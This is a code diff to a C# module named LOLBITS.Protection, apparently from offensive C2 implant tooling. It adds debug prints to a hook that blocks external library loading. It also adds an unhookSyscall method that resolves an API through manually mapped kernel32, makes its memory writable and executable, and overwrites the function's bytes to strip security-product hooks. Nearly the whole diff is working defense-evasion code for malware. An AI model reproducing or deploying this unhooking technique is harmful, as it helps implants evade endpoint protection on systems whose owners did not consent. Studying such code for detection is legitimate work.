@@ -14,6 +14,11 @@ namespace LOLBITS.Protection
         [MethodImpl(MethodImplOptions.NoInlining)]
         public DInvoke.Native.NTSTATUS hookFunc(string pathToFile, ulong flags, string moduleName, IntPtr handle)
         {
+
+            Console.WriteLine("hola");
+            Console.WriteLine(pathToFile);
+            Console.WriteLine(moduleName);
+
             return DInvoke.Native.NTSTATUS.Success; //our hook function will just deny the loading of external libraries
         }
 
@@ -89,6 +94,38 @@ namespace LOLBITS.Protection
             parameters = new object[] { (IntPtr)(-1), address, (UIntPtr)13, oldProtect, x };
             response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
                                                                          typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
+
+            return true;
+        }
+        
+        public unsafe bool unhookSyscall(string dllName, string apiCall, byte[] content)
+        {
+
+            uint oldProtect = 0, x = 0;
+            DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
+            object[] loadLibrary = { dllName };
+
+            var addr = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA",
+                                                                                      typeof(DInvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);
+
+            object[] procAddress = { addr, apiCall };
+
+            var address = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress",
+                                                                            typeof(DInvoke.Win32.DELEGATES.GetProcAddress), procAddress);
+            if (address == IntPtr.Zero)
+                return false;
+
+            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)13, (uint)0x40, oldProtect };
+
+            IntPtr response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
+                                                                                typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
+
+            oldProtect = (uint)parameters[4];
+
+            byte* originalSitePointer = (byte*)address.ToPointer();
+
+            for(int k = 0; k < content.Length; k++)
+                *(originalSitePointer + k) = content[k];
 
             return true;
         }
